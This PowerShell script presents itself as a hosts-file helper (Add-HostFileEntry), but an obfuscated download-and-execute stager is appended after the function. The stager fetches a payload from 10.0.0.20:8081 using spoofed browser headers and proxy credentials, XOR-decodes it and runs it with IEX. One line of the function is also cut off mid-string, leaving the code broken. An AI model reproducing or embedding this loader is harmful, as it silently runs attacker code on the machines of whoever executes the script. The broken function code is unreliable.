

function Add-HostFileEntry{



    [CmdletBinding()]
	param(
		[Parameter(Mandatory=$true)]
		[String]
		$IP,
        
        [Parameter(Mandatory=$true)]
		[String]
		$DNS
	)

    
    
    
    $HostFile = "$env:windir\System32\drivers\etc\hosts"    
    
    [string]$LastLine = Get-Content $HostFile | select -Last 1
    
    if($IP -match [regex]"(([2]([0-4][0-9]|[5][0-5])|[0-1]?[0-9]?[0-9])[.]){3}(([2]([0-4][0-9]|[5][0-5])|[0-1]?[0-9]?[0-9]))"){    
    
        if(!(Get-HostFileEntries | where{$_.DNS -eq $DNS})){      
            
            if($LastLine -ne ""){
                Add-Content -Path $HostFile -Value "`n"
            }
                                             
            Write-Host "Add entry to hosts file: $IP`t$DNS"            
            Add-Content -Path $HostFile -Value "$IP    $DNS"
            
            
            Set-Content -Path $HostFile -Value (Get-Content -Path $HostFile | %{if($_.StartsWith("

        }else{
            
            Write-Error "$DNS is already in use!"        
        }
            
    }else{
    
        Write-Error "IP address is not valid!"
    }
}
$wC=NeW-OBJeCT SySTEm.NET.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDeRS.ADD('User-Agent',$u);$wc.ProXy = [System.NEt.WEbRequeSt]::DEFAuLtWeBPROXy;$wc.PROxy.CREdENTials = [SYstem.Net.CREdentiALCaChE]::DEFaultNETWOrKCreDeNtiAls;$K='2ac9cb7dc02b3c0083eb70898e549b63';$I=0;[ChAR[]]$b=([Char[]]($WC.DownloADStrinG("http://10.0.0.20:8081/index.asp")))|%{$_-bXOr$k[$i++%$K.LenGth]};IEX ($b-jOiN'')

